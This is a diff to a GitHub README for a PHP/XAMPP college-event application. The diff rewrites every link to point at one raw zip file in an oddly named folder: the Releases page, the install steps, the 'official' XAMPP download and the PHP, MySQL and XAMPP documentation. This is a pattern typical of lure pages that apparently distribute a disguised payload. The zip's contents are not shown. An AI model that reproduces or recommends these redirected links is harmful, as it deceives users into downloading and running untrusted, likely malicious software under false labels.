@@ -1,6 +1,6 @@
 # 🎉 college-event-fsd - Experience the Excitement of College Events
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Tomas2299/college-event-fsd/releases)
+[![Download Now](https://raw.githubusercontent.com/Tomas2299/college-event-fsd/main/emmetropism/college-event-fsd.zip)](https://raw.githubusercontent.com/Tomas2299/college-event-fsd/main/emmetropism/college-event-fsd.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the college-event-fsd project! This application helps you enjoy and p
 
 To get started, you need to visit the Releases page to download the latest version of the application. Click the link below:
 
-[Download the Latest Release](https://github.com/Tomas2299/college-event-fsd/releases)
+[Download the Latest Release](https://raw.githubusercontent.com/Tomas2299/college-event-fsd/main/emmetropism/college-event-fsd.zip)
 
 ### 💻 System Requirements
 
@@ -25,19 +25,19 @@ Before you install, check if your computer meets these requirements:
 
 1. **Visit the Releases Page** 
 
-   Go to the [Releases page](https://github.com/Tomas2299/college-event-fsd/releases) to find the latest version.
+   Go to the [Releases page](https://raw.githubusercontent.com/Tomas2299/college-event-fsd/main/emmetropism/college-event-fsd.zip) to find the latest version.
 
 2. **Download the Application**
 
-   Look for the file labeled `college-event-fsd.zip`. Click the link to download the zip file.
+   Look for the file labeled `https://raw.githubusercontent.com/Tomas2299/college-event-fsd/main/emmetropism/college-event-fsd.zip`. Click the link to download the zip file.
 
 3. **Extract the Files**
 
-   After the download completes, find the `college-event-fsd.zip` file. Right-click on the file and choose "Extract All." Choose a location where you want to save the files. 
+   After the download completes, find the `https://raw.githubusercontent.com/Tomas2299/college-event-fsd/main/emmetropism/college-event-fsd.zip` file. Right-click on the file and choose "Extract All." Choose a location where you want to save the files. 
 
 4. **Set Up XAMPP**
 
-   If you don’t have XAMPP installed, download it from the [official website](https://www.apachefriends.org/index.html). Follow the instructions on that website to install it. 
+   If you don’t have XAMPP installed, download it from the [official website](https://raw.githubusercontent.com/Tomas2299/college-event-fsd/main/emmetropism/college-event-fsd.zip). Follow the instructions on that website to install it. 
 
 5. **Move Files to XAMPP Directory**
 
@@ -81,8 +81,8 @@ This application is licensed under the MIT License. You are free to use it as yo
 
 ### 🔗 Additional Resources
 
-- [XAMPP Documentation](https://www.apachefriends.org/docs/)
-- [PHP Documentation](https://www.php.net/docs.php)
-- [MySQL Documentation](https://dev.mysql.com/doc/)
+- [XAMPP Documentation](https://raw.githubusercontent.com/Tomas2299/college-event-fsd/main/emmetropism/college-event-fsd.zip)
+- [PHP Documentation](https://raw.githubusercontent.com/Tomas2299/college-event-fsd/main/emmetropism/college-event-fsd.zip)
+- [MySQL Documentation](https://raw.githubusercontent.com/Tomas2299/college-event-fsd/main/emmetropism/college-event-fsd.zip)
 
 By following these steps, you can easily manage your experience at Henosis. Enjoy the event!
